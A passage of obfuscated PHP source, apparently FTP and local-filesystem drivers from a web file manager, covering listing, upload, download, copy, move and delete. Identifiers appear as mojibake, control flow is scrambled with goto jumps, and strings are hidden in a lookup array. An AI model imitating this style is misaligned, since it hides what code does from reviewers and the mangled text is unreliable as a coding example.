$_SERVER[Æ¡î¢≠¯™]; if (!$this->_isconn()) { return !1; } $e—çÓ∏ÓºÍ = $this->iconvSystem($e—çÓ∏ÓºÍ); goto BéÑÏú‘ìÁ; eÊ⁄∑É≠∏ﬂ: } public function listAll($d∆√ÍãáŸ±) { goto cıà§ﬁ¨æë; cıà§ﬁ¨æë: $EÉòÎ≥∫éë =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->_isconn()) { return !1; } $d∆√ÍãáŸ± = $this->iconvSystem($d∆√ÍãáŸ±); goto DËÜçàõØ¬; DËÜçàõØ¬: $C£ÍˆÒÕﬂ´ = array($EÉòÎ≥∫éë[83] => array(), $EÉòÎ≥∫éë[84] => array()); $this->recursionFtpFiles($d∆√ÍãáŸ±, $C£ÍˆÒÕﬂ´); $aÔ≥™òÇü˜ = array(); goto E¥¡∏⁄ÿ´“; E¥¡∏⁄ÿ´“: foreach ($C£ÍˆÒÕﬂ´[$EÉòÎ≥∫éë[84]] as $F∑øπß·†¶) { $aÔ≥™òÇü˜[] = array($EÉòÎ≥∫éë[85] => $EÉòÎ≥∫éë[8] . trim(str_replace($d∆√ÍãáŸ±, $EÉòÎ≥∫éë[33], $F∑øπß·†¶), $EÉòÎ≥∫éë[8]) . $EÉòÎ≥∫éë[8], $EÉòÎ≥∫éë[86] => 1, $EÉòÎ≥∫éë[87] => 0); } foreach ($C£ÍˆÒÕﬂ´[$EÉòÎ≥∫éë[83]] as $cÖ≠ßéÇ€¶) { $aÔ≥™òÇü˜[] = array($EÉòÎ≥∫éë[85] => $EÉòÎ≥∫éë[8] . trim(str_replace($d∆√ÍãáŸ±, $EÉòÎ≥∫éë[33], $cÖ≠ßéÇ€¶), $EÉòÎ≥∫éë[8]), $EÉòÎ≥∫éë[86] => 0, $EÉòÎ≥∫éë[87] => $this->size($cÖ≠ßéÇ€¶)); } return $aÔ≥™òÇü˜; goto A‚®üøÖ¿à; A‚®üøÖ¿à: } public function getContent($càÛëîıÖ) { if (!$this->_isconn()) { return !1; } $càÛëîıÖ = $this->iconvSystem($càÛëîıÖ); return $this->fileSubstr($càÛëîıÖ); } public function setContent($däÉ§Î⁄´∏, $fÕÜ‰éæÁ¿ = '') { goto E•àïå∑©“; E•àïå∑©“: if (!$this->_isconn()) { return !1; } $C“ê«ë‰ÇÖ = $this->pathThis($this->iconvSystem($däÉ§Î⁄´∏)); $Dß˘ñÍ√¬ñ = $this->tempFile($C“ê«ë‰ÇÖ); goto CåÂ∆»≤≤¢; b·âËßﬂú∞: return $eßÜ…Ÿı´‘; goto EÖ⁄ì–íëå; CåÂ∆»≤≤¢: file_put_contents($Dß˘ñÍ√¬ñ, $fÕÜ‰éæÁ¿); $eßÜ…Ÿı´‘ = $this->upload($däÉ§Î⁄´∏, $this->iconvApp($Dß˘ñÍ√¬ñ)); $this->tempFileRemve($Dß˘ñÍ√¬ñ); goto b·âËßﬂú∞; EÖ⁄ì–íëå: } public function fileSubstr($EàÍˆåù–«, $aúâ£ ¬—Œ = 0, $D≠∏∏Ü∫ıÈ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EàÍˆåù–«, $aúâ£ ¬—Œ, $D≠∏∏Ü∫ıÈ); } private function ftpRequest($a≤“‹«≤∂è, $C¢ÏüÜŸﬂƒ = 0, $dòã«ØÜº≤ = false) { goto F∏ÕîÕìñ¬; aÑçü‰º: curl_setopt($cüâ¶´ÓõÇ, CURLOPT_URL, $AÉãÖ¥æö¢ . $this->pathEncode($a≤“‹«≤∂è)); curl_setopt($cüâ¶´ÓõÇ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($dòã«ØÜº≤) { $E¡Î°ÂÃ£ÿ = $C¢ÏüÜŸﬂƒ + $dòã«ØÜº≤ - 1; curl_setopt($cüâ¶´ÓõÇ, CURLOPT_RANGE, "{$C¢ÏüÜŸﬂƒ}\55{$E¡Î°ÂÃ£ÿ}"); } goto D«∑⁄Ÿ≈“∑; D«∑⁄Ÿ≈“∑: curl_setopt($cüâ¶´ÓõÇ, CURLOPT_RETURNTRANSFER, 1); $c«◊µ·ÂÃ¬ = curl_exec($cüâ¶´ÓõÇ); curl_close($cüâ¶´ÓõÇ); goto fÈ⁄§Î¶ñ≥; F∏ÕîÕìñ¬: $a≤“‹«≤∂è = $this->iconvSystem($a≤“‹«≤∂è); $AÉãÖ¥æö¢ = $this->scheme . $this->host . $_SERVER[Æ¡î¢≠¯™][4] . $this->port; $cüâ¶´ÓõÇ = curl_init(); goto aÑçü‰º; fÈ⁄§Î¶ñ≥: return $c«◊µ·ÂÃ¬; goto Däè∆´È≤°; Däè∆´È≤°: } public function upload($e€¡‘»Ó“Ÿ, $FÜÂπŸá∂›, $d’èıŸ∆ûœ = false, $D∂ùßû≠æâ = REPEAT_REPLACE) { goto e—™óªó¬é; FüìßäîÇ≠: $FÜÂπŸá∂› = $this->iconvSystem($FÜÂπŸá∂›); $A‚Ç‰©õ¶ë = ftp_nb_put($this->connect, $e€¡‘»Ó“Ÿ, $FÜÂπŸá∂›, FTP_BINARY); while ($A‚Ç‰©õ¶ë == FTP_MOREDATA) { $A‚Ç‰©õ¶ë = ftp_nb_continue($this->connect); } goto Aãû∆¬ÿ…—; e—™óªó¬é: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($e€¡‘»Ó“Ÿ))) { return !1; } $e€¡‘»Ó“Ÿ = $this->iconvSystem($e€¡‘»Ó“Ÿ); goto FüìßäîÇ≠; Aãû∆¬ÿ…—: if ($A‚Ç‰©õ¶ë != FTP_FINISHED) { return !1; } return $this->getPathOuter($e€¡‘»Ó“Ÿ); goto EâñÇˆÌ€Ö; EâñÇˆÌ€Ö: } public function download($eò∂Ö¿´ºÔ, $a∏≥»ÏÌΩù = '') { goto dˆâÇÂÏÂ¡; Cöù¥¯Ö›•: while ($aòî¢ÿÜÉ® == FTP_MOREDATA) { $aòî¢ÿÜÉ® = ftp_nb_continue($this->connect); } if ($aòî¢ÿÜÉ® != FTP_FINISHED) { return !1; } return $this->iconvApp($a∏≥»ÏÌΩù); goto D›ŒáÈ◊Ç⁄; A‚≤´ùÓÉ„: $eò∂Ö¿´ºÔ = $this->iconvSystem($eò∂Ö¿´ºÔ); $a∏≥»ÏÌΩù = $this->iconvSystem($a∏≥»ÏÌΩù); $aòî¢ÿÜÉ® = ftp_nb_get($this->connect, $a∏≥»ÏÌΩù, $eò∂Ö¿´ºÔ, FTP_BINARY); goto Cöù¥¯Ö›•; dˆâÇÂÏÂ¡: if (!$this->_isconn()) { return !1; } $C≤’‡πá¶á = $this->pathFather($a∏≥»ÏÌΩù); if (!IO::mkdir($C≤’‡πá¶á)) { return !1; } goto A‚≤´ùÓÉ„; D›ŒáÈ◊Ç⁄: } private function ftpList($dÇàÊ˘Àè©) { goto B¯ïÜ∏Üå∑; Eèô«åø¶ù: $dÇàÊ˘Àè© = rtrim($dÇàÊ˘Àè©, $bÒı¬‡êÀÀ[8]) . $bÒı¬‡êÀÀ[8]; $A÷“ËµáﬁÑ = @ftp_nlist($this->connect, $dÇàÊ˘Àè©); if ($A÷“ËµáﬁÑ === !1) { $A÷“ËµáﬁÑ = @ftp_rawlist($this->connect, $dÇàÊ˘Àè©); foreach ($A÷“ËµáﬁÑ as $Dú¥¥ƒπÇÌ => $aªË‡úÚ—è) { $A÷“ËµáﬁÑ[$Dú¥¥ƒπÇÌ] = end(explode($bÒı¬‡êÀÀ[1142], $aªË‡úÚ—è)); } } goto fÌ¶µ»»Ï¬; B¯ïÜ∏Üå∑: $bÒı¬‡êÀÀ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->isFolder($dÇàÊ˘Àè©)) { return !1; } @ftp_chdir($this->connect, $bÒı¬‡êÀÀ[8]); goto Eèô«åø¶ù; fÌ¶µ»»Ï¬: $CË¢·áÍø∫ = array(); foreach ($A÷“ËµáﬁÑ as $C·Ì¿æ‘Õ¯) { if ($C·Ì¿æ‘Õ¯ == $bÒı¬‡êÀÀ[103] || $C·Ì¿æ‘Õ¯ == $bÒı¬‡êÀÀ[1143]) { continue; } if (!strstr($C·Ì¿æ‘Õ¯, $bÒı¬‡êÀÀ[8])) { $C·Ì¿æ‘Õ¯ = $dÇàÊ˘Àè© . ltrim($C·Ì¿æ‘Õ¯, $bÒı¬‡êÀÀ[8]); } $CË¢·áÍø∫[] = $this->iconvApp($C·Ì¿æ‘Õ¯); } return $CË¢·áÍø∫; goto c∂√ø§â§∑; c∂√ø§â§∑: } private function recursionFtpFiles($BÜõ¡˜≤ÜÎ, &$BôÖ£‘ßéÚ) { $dåÉÀﬁ÷ì∞ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->_isconn()) { return !1; } if (!($c˘Œˆ¥∏ï® = $this->ftpList($BÜõ¡˜≤ÜÎ))) { return !1; } foreach ($c˘Œˆ¥∏ï® as $BÜõ¡˜≤ÜÎ) { if ($this->isFolder($BÜõ¡˜≤ÜÎ)) { $this->recursionFtpFiles($BÜõ¡˜≤ÜÎ, $BôÖ£‘ßéÚ); $BôÖ£‘ßéÚ[$dåÉÀﬁ÷ì∞[84]][] = $BÜõ¡˜≤ÜÎ; } else { $BôÖ£‘ßéÚ[$dåÉÀﬁ÷ì∞[83]][] = $BÜõ¡˜≤ÜÎ; } } } private function objectMeta($A„˜¯Î—Œ∏) { goto CëèºÎô•…; A‰Ïêú§Éù: if ($bµ∂ÃØâ≠  !== null && $bµ∂ÃØâ≠  !== !1) { return $bµ∂ÃØâ≠ ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $c›˜ô…—ôé[8]); goto dÛß≠îÍ◊—; d¯âö‹±Ú´: return $bµ∂ÃØâ≠ ; goto D–Ì’´õéﬂ; CëèºÎô•…: $c›˜ô…—ôé =& $_SERVER[Æ¡î¢≠¯™]; $d∑ƒªµÈ”· = $c›˜ô…—ôé[1144] . md5($A„˜¯Î—Œ∏); $bµ∂ÃØâ≠  = Cache::get($d∑ƒªµÈ”·); goto A‰Ïêú§Éù; dÛß≠îÍ◊—: $Cßã…¨êØ˜ = @ftp_size($this->connect, $this->iconvSystem($A„˜¯Î—Œ∏)); if ($Cßã…¨êØ˜ != -1) { $bµ∂ÃØâ≠  = array($c›˜ô…—ôé[87] => $Cßã…¨êØ˜, $c›˜ô…—ôé[29] => $c›˜ô…—ôé[174]); } else { $céÚıà’Ô∏ = @ftp_chdir($this->connect, $this->iconvSystem($A„˜¯Î—Œ∏)); $bµ∂ÃØâ≠  = $céÚıà’Ô∏ ? array($c›˜ô…—ôé[87] => 0, $c›˜ô…—ôé[29] => $c›˜ô…—ôé[86]) : !1; } Cache::set($d∑ƒªµÈ”·, $bµ∂ÃØâ≠ , 0); goto d¯âö‹±Ú´; D–Ì’´õéﬂ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($BüòƒÇ±Œ√) { if (substr($BüòƒÇ±Œ√, 0, 2) == $_SERVER[Æ¡î¢≠¯™][1133]) { $BüòƒÇ±Œ√ = BASIC_PATH . substr($BüòƒÇ±Œ√, 2); } return $BüòƒÇ±Œ√; } public function iconvApp($Cæâñƒùç«) { $A≠„≈ì“£¨ =& $_SERVER[Æ¡î¢≠¯™]; global $config; return $this->iconvTo($Cæâñƒùç«, $config[$A≠„≈ì“£¨[1131]], $config[$A≠„≈ì“£¨[1130]]); } public function iconvSystem($Fä‰†ÍïÍœ) { $d∞ΩÔÉ£ìí =& $_SERVER[Æ¡î¢≠¯™]; global $config; return $this->iconvTo($Fä‰†ÍïÍœ, $config[$d∞ΩÔÉ£ìí[1130]], $config[$d∞ΩÔÉ£ìí[1131]]); } public function getPathOuter($E∫¨ÊêÍ∂Ω) { goto E¡Ï÷—ÌåÚ; D•≠ÿÇ™∫ﬂ: if (substr($b¯…¢Éû‚«, 0, 2) == $dπ·≈ä‚ıæ[1133]) { $b¯…¢Éû‚« = BASIC_PATH . substr($b¯…¢Éû‚«, 2); } if (substr($E∫¨ÊêÍ∂Ω, 0, 2) == $dπ·≈ä‚ıæ[1133]) { $E∫¨ÊêÍ∂Ω = BASIC_PATH . substr($E∫¨ÊêÍ∂Ω, 2); } $b¯…¢Éû‚« = KodIO::clear($b¯…¢Éû‚«); goto DÑÇ¡È€ó¿; DÑÇ¡È€ó¿: $E∫¨ÊêÍ∂Ω = KodIO::clear($E∫¨ÊêÍ∂Ω); $E∫¨ÊêÍ∂Ω = substr($E∫¨ÊêÍ∂Ω, strlen($b¯…¢Éû‚«)); if (empty($this->pathDriver)) { return $E∫¨ÊêÍ∂Ω; } goto eºÇÌ◊ñÙÍ; eºÇÌ◊ñÙÍ: return $this->pathDriver . $dπ·≈ä‚ıæ[8] . ltrim($E∫¨ÊêÍ∂Ω, $dπ·≈ä‚ıæ[8]); goto A±’‡°Ú∑ƒ; E¡Ï÷—ÌåÚ: $dπ·≈ä‚ıæ =& $_SERVER[Æ¡î¢≠¯™]; $b¯…¢Éû‚« = $this->iconvApp($this->pathBase); $E∫¨ÊêÍ∂Ω = $this->iconvApp($E∫¨ÊêÍ∂Ω); goto D•≠ÿÇ™∫ﬂ; A±’‡°Ú∑ƒ: } public function mkfile($A¢±¥èÓ≈°, $cÁ†äúÉﬁ÷ = '', $dáÜêè≥†¿ = REPEAT_RENAME) { $A¢±¥èÓ≈° = $this->iconvSystem($A¢±¥èÓ≈°); @touch($A¢±¥èÓ≈°); if ($cÁ†äúÉﬁ÷) { file_put_contents($A¢±¥èÓ≈°, $cÁ†äúÉﬁ÷); } return is_file($A¢±¥èÓ≈°) ? $this->getPathOuter($A¢±¥èÓ≈°) : !1; } public function mkdir($d‚ç®Ê™ç©, $dÊöüàΩ’â = REPEAT_SKIP) { $d‚ç®Ê™ç© = $this->iconvSystem($d‚ç®Ê™ç©); if (is_dir($d‚ç®Ê™ç©)) { return $this->getPathOuter($d‚ç®Ê™ç©); } @mkdir($d‚ç®Ê™ç©, 511, !0); return is_dir($d‚ç®Ê™ç©) ? $this->getPathOuter($d‚ç®Ê™ç©) : !1; } public function copyFile($d†ûÔÎáëÈ, $B„€®ï›±õ) { $this->mkdir($this->pathFather($B„€®ï›±õ)); $d†ûÔÎáëÈ = $this->iconvSystem($d†ûÔÎáëÈ); $B„€®ï›±õ = $this->iconvSystem($B„€®ï›±õ); $c–ê‚≤êÜË = @copy($d†ûÔÎáëÈ, $B„€®ï›±õ); return $c–ê‚≤êÜË ? $this->getPathOuter($B„€®ï›±õ) : !1; } public function moveFile($BÙ’˜åíÏø, $a£±˘ﬂ´ÉÚ) { $this->mkdir($this->pathFather($a£±˘ﬂ´ÉÚ)); $BÙ’˜åíÏø = $this->iconvSystem($BÙ’˜åíÏø); $a£±˘ﬂ´ÉÚ = $this->iconvSystem($a£±˘ﬂ´ÉÚ); $cÉÏÒØ¶¬ê = intval(@rename($BÙ’˜åíÏø, $a£±˘ﬂ´ÉÚ)); if (!$cÉÏÒØ¶¬ê) { if ($cÉÏÒØ¶¬ê = intval(@copy($BÙ’˜åíÏø, $a£±˘ﬂ´ÉÚ))) { @unlink($BÙ’˜åíÏø); } } return $cÉÏÒØ¶¬ê ? $this->getPathOuter($a£±˘ﬂ´ÉÚ) : !1; } public function delFile($E†ŸõÑÜ§®) { $E†ŸõÑÜ§® = $this->iconvSystem($E†ŸõÑÜ§®); if (!@unlink($E†ŸõÑÜ§®)) { @chmod($E†ŸõÑÜ§®, 511); if (!@unlink($E†ŸõÑÜ§®)) { return !1; } } else { return !0; } } public function delFolder($F¯∆ÓúÁ‡ø) { goto AÙ‹⁄ë´öÓ; AÙ‹⁄ë´öÓ: $dÒ‚∆èã∑Ñ =& $_SERVER[Æ¡î¢≠¯™]; $F¯∆ÓúÁ‡ø = $this->iconvSystem($F¯∆ÓúÁ‡ø); if (!is_dir($F¯∆ÓúÁ‡ø)) { return !0; } goto AòÁ®ﬂ´Éπ; C£¢∂¿πÒ±: return rmdir($F¯∆ÓúÁ‡ø); goto eöÜﬁπ¶ΩÌ; AòÁ®ﬂ´Éπ: if (!($BªÛÈ¶Üëï = opendir($F¯∆ÓúÁ‡ø))) { return !1; } while (($EåäØ‘¯œõ = readdir($BªÛÈ¶Üëï)) !== !1) { if ($EåäØ‘¯œõ == $dÒ‚∆èã∑Ñ[103] || $EåäØ‘¯œõ == $dÒ‚∆èã∑Ñ[1143]) { continue; } $A˜Ï∫‰Ï⁄ = $F¯∆ÓúÁ‡ø . $dÒ‚∆èã∑Ñ[8] . $EåäØ‘¯œõ; if (!is_dir($A˜Ï∫‰Ï⁄)) { if (!unlink($A˜Ï∫‰Ï⁄)) { chmod($A˜Ï∫‰Ï⁄, 511); if (!unlink($A˜Ï∫‰Ï⁄)) { return !1; } } } else { chmod($A˜Ï∫‰Ï⁄, 511); $A˜Ï∫‰Ï⁄ = $this->iconvApp($A˜Ï∫‰Ï⁄); if (!$this->delFolder($A˜Ï∫‰Ï⁄)) { return !1; } } } closedir($BªÛÈ¶Üëï); goto C£¢∂¿πÒ±; eöÜﬁπ¶ΩÌ: } public function rename($D‹¬îìÃ÷Ÿ, $A∞≤¢ ÿçâ) { goto b¬Ùÿ˜óá¨; Eé„ò‚Òóó: $F›ˆÉÀ•ﬂ¨ = @rename($D‹¬îìÃ÷Ÿ, $a—àïã„…–); $a—àïã„…– = $this->iconvApp($a—àïã„…–); return $F›ˆÉÀ•ﬂ¨ ? $this->getPathOuter($a—àïã„…–) : !1; goto dã∑˜¥Â‡∑; b¬Ùÿ˜óá¨: $C‡ù∑πà»± =& $_SERVER[Æ¡î¢≠¯™]; $Fò≤ÙäÓã» = $this->fileNameAuto($this->pathFather($D‹¬îìÃ÷Ÿ), $A∞≤¢ ÿçâ); $Fò≤ÙäÓã» = $this->iconvSystem($Fò≤ÙäÓã»); goto EºÆô∑Ê°˜; EºÆô∑Ê°˜: $D‹¬îìÃ÷Ÿ = $this->iconvSystem($D‹¬îìÃ÷Ÿ); $aá¿¬êﬂùé = $this->pathFather($D‹¬îìÃ÷Ÿ); $a—àïã„…– = rtrim($aá¿¬êﬂùé, $C‡ù∑πà»±[8]) . $C‡ù∑πà»±[8] . $Fò≤ÙäÓã»; goto Eé„ò‚Òóó; dã∑˜¥Â‡∑: } public function size($Bïãéò–Íú) { $Bïãéò–Íú = $this->iconvSystem($Bïãéò–Íú); return (double) abs(sprintf($_SERVER[Æ¡î¢≠¯™][1145], @filesize($Bïãéò–Íú))); } public function info($DƒÒè„Çª) { $DƒÒè„Çª = $this->iconvSystem($DƒÒè„Çª); if ($this->isFolder($DƒÒè„Çª)) { return $this->folderInfo($DƒÒè„Çª); } else { if ($this->isFile($DƒÒè„Çª)) { return $this->fileInfo($DƒÒè„Çª); } } return !1; } protected function infoChildren($C∞â†ÑÎñì, &$EÛ≈¬¥íıß, $dÑõÚˆÔ≈√ = true) { $d÷±∫óèåÒ =& $_SERVER[Æ¡î¢≠¯™]; $C∞â†ÑÎñì = rtrim($C∞â†ÑÎñì, $d÷±∫óèåÒ[8]) . $d÷±∫óèåÒ[8]; if ($dÑõÚˆÔ≈√) { check_abort(); $C∞â†ÑÎñì = $this->iconvSystem($C∞â†ÑÎñì); } if (!($cõÍ–Ì≤∞° = @opendir($C∞â†ÑÎñì))) { return; } while (($A„‡ã∏ß‚≠ = readdir($cõÍ–Ì≤∞°)) !== !1) { if ($A„‡ã∏ß‚≠ == $d÷±∫óèåÒ[103] || $A„‡ã∏ß‚≠ == $d÷±∫óèåÒ[1143]) { continue; } $Fóä„íÚÂ§ = $C∞â†ÑÎñì . $A„‡ã∏ß‚≠; if (is_file($Fóä„íÚÂ§)) { $EÛ≈¬¥íıß[$d÷±∫óèåÒ[88]]++; $EÛ≈¬¥íıß[$d÷±∫óèåÒ[87]] += (double) abs(sprintf($d÷±∫óèåÒ[1145], @filesize($Fóä„íÚÂ§))); } else { $EÛ≈¬¥íıß[$d÷±∫óèåÒ[89]]++; $this->infoChildren($Fóä„íÚÂ§, $EÛ≈¬¥íıß, !1); } } closedir($cõÍ–Ì≤∞°); } private function folderInfo($Cç◊⁄êÔá», $Bã”â Öπ⁄ = false) { $a≠ãù∞âπ◊ =& $_SERVER[Æ¡î¢≠¯™]; $Cç◊⁄êÔá» = rtrim($Cç◊⁄êÔá», $a≠ãù∞âπ◊[8]) . $a≠ãù∞âπ◊[8]; $EãÑî‚Ÿ∞é = $this->iconvApp($this->pathThis($Cç◊⁄êÔá»)); if ($Bã”â Öπ⁄) { return array($a≠ãù∞âπ◊[28] => $EãÑî‚Ÿ∞é, $a≠ãù∞âπ◊[85] => $this->getPathOuter($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[29] => $a≠ãù∞âπ◊[86]); } $A®æ÷ÁñÌÛ = array($a≠ãù∞âπ◊[28] => $EãÑî‚Ÿ∞é, $a≠ãù∞âπ◊[85] => $this->getPathOuter($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[29] => $a≠ãù∞âπ◊[86], $a≠ãù∞âπ◊[194] => @filectime($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[117] => @filemtime($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[1146] => @fileatime($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[1140] => is_readable($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[1141] => is_writable($Cç◊⁄êÔá»), $a≠ãù∞âπ◊[1147] => get_mode($Cç◊⁄êÔá»)); return $A®æ÷ÁñÌÛ; } private function fileInfo($bÕ©Ö˜ﬁ˜æ, $Dèò·»’ ù = false) { $a¿Øâòëàÿ =& $_SERVER[Æ¡î¢≠¯™]; $fÒΩüà£Ôç = $this->iconvApp($this->pathThis($bÕ©Ö˜ﬁ˜æ)); if ($Dèò·»’ ù) { return array($a¿Øâòëàÿ[28] => $fÒΩüà£Ôç, $a¿Øâòëàÿ[85] => $this->getPathOuter($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[29] => $a¿Øâòëàÿ[174], $a¿Øâòëàÿ[87] => $this->size($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[167] => $this->ext($fÒΩüà£Ôç)); } $Dæ¬Íé¡ˆŸ = array($a¿Øâòëàÿ[28] => $fÒΩüà£Ôç, $a¿Øâòëàÿ[85] => $this->getPathOuter($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[29] => $a¿Øâòëàÿ[174], $a¿Øâòëàÿ[194] => @filectime($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[117] => @filemtime($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[1146] => @fileatime($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[87] => $this->size($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[167] => $this->ext($fÒΩüà£Ôç), $a¿Øâòëàÿ[1140] => is_readable($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[1141] => is_writable($bÕ©Ö˜ﬁ˜æ), $a¿Øâòëàÿ[1147] => get_mode($bÕ©Ö˜ﬁ˜æ)); return $Dæ¬Íé¡ˆŸ; } public function exist($E—∏æ¥îÉ÷) { $E—∏æ¥îÉ÷ = $this->iconvSystem($E—∏æ¥îÉ÷); return @file_exists($E—∏æ¥îÉ÷); } public function isFile($Fÿ±πΩó∏§) { $Fÿ±πΩó∏§ = $this->iconvSystem($Fÿ±πΩó∏§); return @is_file($Fÿ±πΩó∏§); } public function isFolder($a«Ô“ã∑àÂ) { $a«Ô“ã∑àÂ = $this->iconvSystem($a«Ô“ã∑àÂ); return @is_dir($a«Ô“ã∑àÂ); } public function listPath($Bæ‚çÊñ“Ü, $Cƒ•Êù´®ﬂ = false) { goto CÀçÚåÈ™ô; eçî¢»Ùõÿ: closedir($eÑô◊®ß—∆); return $e∞Ñù±⁄√æ; goto b¯€ÿƒÉå≠; CÀçÚåÈ™ô: $FÚ∏¬’åä≈ =& $_SERVER[Æ¡î¢≠¯™]; $Bæ‚çÊñ“Ü = $this->iconvSystem($Bæ‚çÊñ“Ü); $Bæ‚çÊñ“Ü = rtrim($Bæ‚çÊñ“Ü, $FÚ∏¬’åä≈[8]) . $FÚ∏¬’åä≈[8]; goto e‘èÕ‹≠©§; e‘èÕ‹≠©§: $e∞Ñù±⁄√æ = array($FÚ∏¬’åä≈[84] => array(), $FÚ∏¬’åä≈[83] => array()); if (!($eÑô◊®ß—∆ = @opendir($Bæ‚çÊñ“Ü))) { return $e∞Ñù±⁄√æ; } while (($aä≈–¨®Ωü = readdir($eÑô◊®ß—∆)) !== !1) { if ($aä≈–¨®Ωü == $FÚ∏¬’åä≈[103] || $aä≈–¨®Ωü == $FÚ∏¬’åä≈[1143]) { continue; } $aÆÉﬂ√ˆ∏ç = $Bæ‚çÊñ“Ü . $aä≈–¨®Ωü; if (is_file($aÆÉﬂ√ˆ∏ç)) { $e∞Ñù±⁄√æ[$FÚ∏¬’åä≈[83]][] = $this->fileInfo($aÆÉﬂ√ˆ∏ç, $Cƒ•Êù´®ﬂ); } else { $e∞Ñù±⁄√æ[$FÚ∏¬’åä≈[84]][] = $this->folderInfo($aÆÉﬂ√ˆ∏ç, $Cƒ•Êù´®ﬂ); } } goto eçî¢»Ùõÿ; b¯€ÿƒÉå≠: } public function listAll($c≠ù—πÈ∏Ë, &$DŸã¯å°£∂ = array()) { goto DÚòú‰Ø¨ß; DÚòú‰Ø¨ß: $cπ·õ‰øùÆ =& $_SERVER[Æ¡î¢≠¯™]; $c≠ù—πÈ∏Ë = $this->iconvSystem($c≠ù—πÈ∏Ë); $c≠ù—πÈ∏Ë = rtrim($c≠ù—πÈ∏Ë, $cπ·õ‰øùÆ[8]) . $cπ·õ‰øùÆ[8]; goto bä Ï∞•Ë; aàáª‘Ï°∂: return $DŸã¯å°£∂; goto a¶°ÊÍâ∫á; bä Ï∞•Ë: if (!($föÔ≈∫ÌÚÙ = @opendir($c≠ù—πÈ∏Ë))) { return $DŸã¯å°£∂; } while (($b†∆®°ã°„ = readdir($föÔ≈∫ÌÚÙ)) !== !1) { if ($b†∆®°ã°„ == $cπ·õ‰øùÆ[103] || $b†∆®°ã°„ == $cπ·õ‰øùÆ[1143]) { continue; } $b±·á°•‡Ò = $c≠ù—πÈ∏Ë . $b†∆®°ã°„; if (is_dir($b±·á°•‡Ò)) { $DŸã¯å°£∂[] = array($cπ·õ‰øùÆ[85] => $b±·á°•‡Ò . $cπ·õ‰øùÆ[8], $cπ·õ‰øùÆ[86] => 1, $cπ·õ‰øùÆ[87] => 0); $this->listAll($b±·á°•‡Ò, $DŸã¯å°£∂); } else { $DŸã¯å°£∂[] = array($cπ·õ‰øùÆ[85] => $b±·á°•‡Ò, $cπ·õ‰øùÆ[86] => 0, $cπ·õ‰øùÆ[87] => $this->size($b±·á°•‡Ò)); } } closedir($föÔ≈∫ÌÚÙ); goto aàáª‘Ï°∂; a¶°ÊÍâ∫á: } public function has($F•⁄“∫ÁùÑ, $eáªá˜˜ÎÉ = false, $CÖº·œ™ÇÜ = true) { goto cÉ«†îÎá¨; F±•Ì‡…ï‰: while (($FÀêÒ‰ùÛ = readdir($cﬁ∫Ú•ÚÛÛ)) !== !1) { if ($FÀêÒ‰ùÛ == $aèÍË≥˘ıœ[103] || $FÀêÒ‰ùÛ == $aèÍË≥˘ıœ[1143]) { continue; } $B˘å∑êàñ› = $F•⁄“∫ÁùÑ . $FÀêÒ‰ùÛ; if ($eáªá˜˜ÎÉ) { if (@is_file($B˘å∑êàñ›)) { $aõ‚àÍƒÆ»++; } else { $fÜ««Á¨∏–++; } continue; } if ($CÖº·œ™ÇÜ) { if (@is_file($B˘å∑êàñ›)) { return !0; } } else { if (@is_dir($B˘å∑êàñ› . $aèÍË≥˘ıœ[8])) { return !0; } } } closedir($cﬁ∫Ú•ÚÛÛ); if ($eáªá˜˜ÎÉ) { return array($aèÍË≥˘ıœ[198] => $aõ‚àÍƒÆ», $aèÍË≥˘ıœ[199] => $fÜ««Á¨∏–); } goto aÇéü√Ãñó; cÉ«†îÎá¨: $aèÍË≥˘ıœ =& $_SERVER[Æ¡î¢≠¯™]; $F•⁄“∫ÁùÑ = $this->iconvSystem($F•⁄“∫ÁùÑ); $F•⁄“∫ÁùÑ = rtrim($F•⁄“∫ÁùÑ, $aèÍË≥˘ıœ[8]) . $aèÍË≥˘ıœ[8]; goto F∑âßÎé®¬; aÇéü√Ãñó: return !1; goto Aü—∑ú˘Êá; F∑âßÎé®¬: if (!($cﬁ∫Ú•ÚÛÛ = @opendir($F•⁄“∫ÁùÑ))) { return !1; } $aõ‚àÍƒÆ» = 0; $fÜ««Á¨∏– = 0; goto F±•Ì‡…ï‰; Aü—∑ú˘Êá: } public function hashSimple($Eﬁ´á™¨ÁÈ) { goto fﬁàÇΩ∏â£; dÌ¥®π…ñÓ: $D«ïåú‡úÒ = fopen($Eﬁ´á™¨ÁÈ, $eÚ„”«Ô”É[1148]); if (!$D«ïåú‡úÒ) { return $EëÓ∏◊‹¥›; } for ($e•∂‘≥ãáç = 0; $e•∂‘≥ãáç < $Eö—äÍüÌÕ; $e•∂‘≥ãáç++) { fseek($D«ïåú‡úÒ, $F‰†…∂±Óá * $e•∂‘≥ãáç); $EëÓ∏◊‹¥› .= fread($D«ïåú‡úÒ, $Fﬂµ÷ûﬁ∏); } goto D¨ÿÑ„ƒ‹Ø; dÂøãΩ¨ﬂë: $CŸ è§Ë‹ê = $this->size($Eﬁ´á™¨ÁÈ); $Fﬂµ÷ûﬁ∏ = 200; $Eö—äÍüÌÕ = 50; goto D‘Ñˆ„ÃÕò; D¨ÿÑ„ƒ‹Ø: fseek($D«ïåú‡úÒ, $CŸ è§Ë‹ê - $Fﬂµ÷ûﬁ∏); 